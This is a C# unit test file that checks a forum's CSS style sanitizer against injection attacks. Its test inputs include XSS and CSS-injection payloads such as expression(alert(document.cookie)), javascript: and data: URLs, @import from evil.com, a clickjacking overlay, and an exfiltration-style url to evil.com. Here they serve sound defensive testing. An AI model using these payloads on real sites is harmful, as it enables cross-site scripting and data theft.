namespace TASVideos.ForumEngineTests;

/// <summary>
/// Tests for the StyleSanitizer class, including protection against known injection attacks.
/// </summary>
[TestClass]
public class StyleSanitizerTests
{
	#region Valid Style Tests

	[TestMethod]
	public void SanitizePropertyValue_ValidColor_Hex()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "#ff0000");
		Assert.AreEqual("color: #ff0000", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidColor_ShortHex()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "#f00");
		Assert.AreEqual("color: #f00", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidColor_Rgb()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "rgb(255, 0, 0)");
		Assert.AreEqual("color: rgb(255, 0, 0)", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidColor_Rgba()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "rgba(255, 0, 0, 0.5)");
		Assert.AreEqual("color: rgba(255, 0, 0, 0.5)", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidColor_NamedColor()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "red");
		Assert.AreEqual("color: red", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidBackgroundColor()
	{
		var result = StyleSanitizer.SanitizePropertyValue("background-color", "#00ff00");
		Assert.AreEqual("background-color: #00ff00", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidFontSize_Pixels()
	{
		var result = StyleSanitizer.SanitizePropertyValue("font-size", "16px");
		Assert.AreEqual("font-size: 16px", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidFontSize_Em()
	{
		var result = StyleSanitizer.SanitizePropertyValue("font-size", "1.5em");
		Assert.AreEqual("font-size: 1.5em", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidFontSize_Percent()
	{
		var result = StyleSanitizer.SanitizePropertyValue("font-size", "120%");
		Assert.AreEqual("font-size: 120%", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidFontWeight()
	{
		var result = StyleSanitizer.SanitizePropertyValue("font-weight", "bold");
		Assert.AreEqual("font-weight: bold", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidTextAlign()
	{
		var result = StyleSanitizer.SanitizePropertyValue("text-align", "center");
		Assert.AreEqual("text-align: center", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidMargin()
	{
		var result = StyleSanitizer.SanitizePropertyValue("margin", "10px");
		Assert.AreEqual("margin: 10px", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_ValidPadding()
	{
		var result = StyleSanitizer.SanitizePropertyValue("padding", "5px");
		Assert.AreEqual("padding: 5px", result);
	}

	#endregion

	#region CSS Injection Attack Tests

	[TestMethod]
	public void SanitizePropertyValue_BlocksJavaScriptExpression()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "expression(alert('XSS'))");
		Assert.AreEqual("", result, "Should block CSS expression()");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksUrlFunction()
	{
		var result = StyleSanitizer.SanitizePropertyValue("background-color", "url(javascript:alert('XSS'))");
		Assert.AreEqual("", result, "Should block url() function");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksUrlWithSpaces()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "url (http://evil.com)");
		Assert.AreEqual("", result, "Should block url () with space");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksJavaScriptProtocol()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "javascript:alert('XSS')");
		Assert.AreEqual("", result, "Should block javascript: protocol");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksVbScriptProtocol()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "vbscript:msgbox('XSS')");
		Assert.AreEqual("", result, "Should block vbscript: protocol");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksDataProtocol()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "data:text/html,<script>alert('XSS')</script>");
		Assert.AreEqual("", result, "Should block data: protocol");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksImport()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "@import url(evil.css)");
		Assert.AreEqual("", result, "Should block @import");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksBehavior()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "behavior:url(evil.htc)");
		Assert.AreEqual("", result, "Should block behavior:");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksMozBinding()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "-moz-binding:url(evil.xml)");
		Assert.AreEqual("", result, "Should block -moz-binding");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksHtmlTags()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "<script>alert('XSS')</script>");
		Assert.AreEqual("", result, "Should block HTML tags");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksQuotes()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "red\"; alert('XSS'); \"");
		Assert.AreEqual("", result, "Should block quote characters");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksBackslash()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "red\\; position: fixed");
		Assert.AreEqual("", result, "Should block backslash escape attempts");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksCalcFunction()
	{
		var result = StyleSanitizer.SanitizePropertyValue("font-size", "calc(100% + 50px)");
		Assert.AreEqual("", result, "Should block calc() function");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksVarFunction()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "var(--custom-color)");
		Assert.AreEqual("", result, "Should block var() function");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksAttrFunction()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "attr(data-color)");
		Assert.AreEqual("", result, "Should block attr() function");
	}

	#endregion

	#region Position and Overlay Attack Tests

	[TestMethod]
	public void SanitizePropertyValue_BlocksPositionProperty()
	{
		var result = StyleSanitizer.SanitizePropertyValue("position", "fixed");
		Assert.AreEqual("", result, "Should block position property (not in whitelist)");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksZIndexProperty()
	{
		var result = StyleSanitizer.SanitizePropertyValue("z-index", "9999");
		Assert.AreEqual("", result, "Should block z-index property (not in whitelist)");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksPositionInValue()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "red; position: fixed");
		Assert.AreEqual("", result, "Should block position: in value");
	}

	[TestMethod]
	public void SanitizePropertyValue_BlocksZIndexInValue()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "red; z-index: 9999");
		Assert.AreEqual("", result, "Should block z-index: in value");
	}

	#endregion

	#region Style String Tests (Multiple Rules)

	[TestMethod]
	public void SanitizeStyle_ValidMultipleRules()
	{
		var result = StyleSanitizer.SanitizeStyle("color: red; font-size: 14px; text-align: center");
		Assert.IsTrue(result.Contains("color: red"), "Should contain color rule");
		Assert.IsTrue(result.Contains("font-size: 14px"), "Should contain font-size rule");
		Assert.IsTrue(result.Contains("text-align: center"), "Should contain text-align rule");
	}

	[TestMethod]
	public void SanitizeStyle_FiltersInvalidRules()
	{
		var result = StyleSanitizer.SanitizeStyle("color: red; position: fixed; font-size: 14px");
		Assert.IsTrue(result.Contains("color: red"), "Should contain valid color rule");
		Assert.IsTrue(result.Contains("font-size: 14px"), "Should contain valid font-size rule");
		Assert.IsFalse(result.Contains("position"), "Should filter out position rule");
	}

	[TestMethod]
	public void SanitizeStyle_EmptyString_ReturnsEmpty()
	{
		var result = StyleSanitizer.SanitizeStyle("");
		Assert.AreEqual("", result);
	}

	[TestMethod]
	public void SanitizeStyle_OnlyInvalidRules_ReturnsEmpty()
	{
		var result = StyleSanitizer.SanitizeStyle("position: fixed; z-index: 999; top: 0");
		Assert.AreEqual("", result, "Should return empty when all rules are invalid");
	}

	[TestMethod]
	public void SanitizeStyle_LimitComplexity_MaxFiveRules()
	{
		var result = StyleSanitizer.SanitizeStyle("color: red; font-size: 14px; text-align: center; margin: 5px; padding: 5px; border-color: blue; opacity: 0.5");
		var ruleCount = result.Split(';', StringSplitOptions.RemoveEmptyEntries).Length;
		Assert.IsTrue(ruleCount <= 5, $"Should limit to max 5 rules, got {ruleCount}");
	}

	#endregion

	#region Spacing Limit Tests

	[TestMethod]
	public void SanitizePropertyValue_MarginTooLarge_Pixels()
	{
		var result = StyleSanitizer.SanitizePropertyValue("margin", "500px");
		Assert.AreEqual("", result, "Should reject margin > 100px");
	}

	[TestMethod]
	public void SanitizePropertyValue_MarginValid_Pixels()
	{
		var result = StyleSanitizer.SanitizePropertyValue("margin", "50px");
		Assert.AreEqual("margin: 50px", result, "Should accept margin <= 100px");
	}

	[TestMethod]
	public void SanitizePropertyValue_PaddingTooLarge_Em()
	{
		var result = StyleSanitizer.SanitizePropertyValue("padding", "20em");
		Assert.AreEqual("", result, "Should reject padding > 10em");
	}

	[TestMethod]
	public void SanitizePropertyValue_PaddingValid_Em()
	{
		var result = StyleSanitizer.SanitizePropertyValue("padding", "5em");
		Assert.AreEqual("padding: 5em", result, "Should accept padding <= 10em");
	}

	[TestMethod]
	public void SanitizePropertyValue_MarginValid_Percent()
	{
		var result = StyleSanitizer.SanitizePropertyValue("margin", "50%");
		Assert.AreEqual("margin: 50%", result, "Should accept margin <= 100%");
	}

	#endregion

	#region Edge Cases and Security Tests

	[TestMethod]
	public void SanitizePropertyValue_CaseInsensitive_Expression()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "ExPrEsSiOn(alert('XSS'))");
		Assert.AreEqual("", result, "Should block expression with mixed case");
	}

	[TestMethod]
	public void SanitizePropertyValue_CaseInsensitive_JavaScript()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "JaVaScRiPt:alert('XSS')");
		Assert.AreEqual("", result, "Should block javascript: with mixed case");
	}

	[TestMethod]
	public void SanitizePropertyValue_ExcessiveLength()
	{
		var longValue = new string('a', 200);
		var result = StyleSanitizer.SanitizePropertyValue("color", longValue);
		Assert.AreEqual("", result, "Should reject excessively long values");
	}

	[TestMethod]
	public void SanitizePropertyValue_NullProperty_ReturnsEmpty()
	{
		var result = StyleSanitizer.SanitizePropertyValue(null!, "red");
		Assert.AreEqual("", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_NullValue_ReturnsEmpty()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", null!);
		Assert.AreEqual("", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_WhitespaceOnly_ReturnsEmpty()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "   ");
		Assert.AreEqual("", result);
	}

	#endregion

	#region Semicolon Injection Tests

	[TestMethod]
	public void SanitizePropertyValue_SemicolonInjection_SingleProperty()
	{
		var result = StyleSanitizer.SanitizePropertyValue("color", "red; position: fixed");
		Assert.AreEqual("", result, "Should reject values containing semicolons");
	}

	[TestMethod]
	public void SanitizeStyle_PropertyInjection_ViaValue()
	{
		// This simulates [color=red; position: fixed;]
		var result = StyleSanitizer.SanitizeStyle("color: red; position: fixed");
		Assert.IsTrue(result.Contains("color: red"), "Should keep valid color");
		Assert.IsFalse(result.Contains("position"), "Should filter injected position");
	}

	#endregion

	#region Font Family Special Handling

	[TestMethod]
	public void SanitizePropertyValue_FontFamily_Valid()
	{
		var result = StyleSanitizer.SanitizePropertyValue("font-family", "Arial, Helvetica, sans-serif");
		Assert.AreEqual("font-family: Arial, Helvetica, sans-serif", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_FontFamily_WithQuotes()
	{
		var result = StyleSanitizer.SanitizePropertyValue("font-family", "Times New Roman");
		Assert.AreEqual("font-family: Times New Roman", result);
	}

	[TestMethod]
	public void SanitizePropertyValue_FontFamily_BlocksInjection()
	{
		var result = StyleSanitizer.SanitizePropertyValue("font-family", "Arial; position: fixed");
		Assert.AreEqual("", result, "Should block font-family with semicolon injection");
	}

	#endregion

	#region Real-World Attack Scenarios

	[TestMethod]
	public void RealWorldAttack_ClickjackingOverlay()
	{
		// Attacker tries to overlay content over other elements
		var result = StyleSanitizer.SanitizeStyle("position: fixed; z-index: 99999; top: 0; left: 0; width: 100%; height: 100%; background: transparent");
		Assert.AreEqual("", result, "Should completely block clickjacking overlay attempt");
	}

	[TestMethod]
	public void RealWorldAttack_DataExfiltration()
	{
		// Attacker tries to load external resources to exfiltrate data
		var result = StyleSanitizer.SanitizePropertyValue("background", "url(http://evil.com/steal?data=secret)");
		Assert.AreEqual("", result, "Should block data exfiltration via background url");
	}

	[TestMethod]
	public void RealWorldAttack_IEExpression()
	{
		// Old IE-specific attack vector
		var result = StyleSanitizer.SanitizePropertyValue("width", "expression(alert(document.cookie))");
		Assert.AreEqual("", result, "Should block IE expression attack");
	}

	[TestMethod]
	public void RealWorldAttack_ImportExternalCSS()
	{
		// Attacker tries to import malicious external CSS
		var result = StyleSanitizer.SanitizePropertyValue("color", "@import url(http://evil.com/malicious.css)");
		Assert.AreEqual("", result, "Should block external CSS import");
	}

	[TestMethod]
	public void RealWorldAttack_MultipleInjections()
	{
		// Attacker tries multiple injection vectors in one value
		var result = StyleSanitizer.SanitizeStyle("color: red; expression(alert(1)); background: url(javascript:alert(2)); position: fixed");
		Assert.IsTrue(result.Contains("color: red") || result == "", "Should only keep valid color or reject all");
		Assert.IsFalse(result.Contains("expression"), "Should filter expression");
		Assert.IsFalse(result.Contains("url"), "Should filter url");
		Assert.IsFalse(result.Contains("position"), "Should filter position");
	}

	#endregion
}
